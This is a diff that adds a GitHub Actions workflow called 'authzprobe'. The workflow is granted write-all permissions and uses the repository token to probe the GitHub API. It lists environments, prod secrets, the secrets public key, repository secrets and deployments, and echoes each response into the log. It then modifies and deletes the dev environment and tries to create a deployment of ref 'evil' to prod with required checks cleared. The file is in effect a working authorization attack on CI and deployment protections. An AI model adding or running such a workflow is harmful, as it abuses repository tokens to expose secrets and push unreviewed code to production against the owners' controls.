@@ -1,0 +1,26 @@
+name: authzprobe
+on:
+  workflow_dispatch:
+    inputs:
+      run_id:
+        description: pending run id
+        default: "0"
+permissions: write-all
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probes
+        run: |
+          R="$GITHUB_REPOSITORY"
+          T="${{ github.token }}"
+          for u in "repos/$R/environments" "repos/$R/environments/prod" "repos/$R/environments/prod/secrets" "repos/$R/environments/prod/secrets/public-key" "repos/$R/actions/secrets" "repos/$R/deployments" "repos/$R/actions/runs/${{ inputs.run_id }}/pending_deployments"; do
+            c=$(curl -s -o o.json -w "%{http_code}" -H "Authorization: token $T" "https://api.github.com/$u")
+            echo "GET $u -> $c :: $(head -c 160 o.json)"
+          done
+          c=$(curl -s -o o.json -w "%{http_code}" -X PUT -H "Authorization: token $T" -H "Content-Type: application/json" "https://api.github.com/repos/$R/environments/dev" -d '{"wait_timer":0}')
+          echo "PUT env dev -> $c :: $(head -c 160 o.json)"
+          c=$(curl -s -o o.json -w "%{http_code}" -X POST -H "Authorization: token $T" -H "Content-Type: application/json" "https://api.github.com/repos/$R/deployments" -d '{"ref":"evil","environment":"prod","required_contexts":[]}')
+          echo "POST deployment evil/prod -> $c :: $(head -c 200 o.json)"
+          c=$(curl -s -o o.json -w "%{http_code}" -X DELETE -H "Authorization: token $T" "https://api.github.com/repos/$R/environments/dev")
+          echo "DELETE env dev -> $c :: $(head -c 160 o.json)"
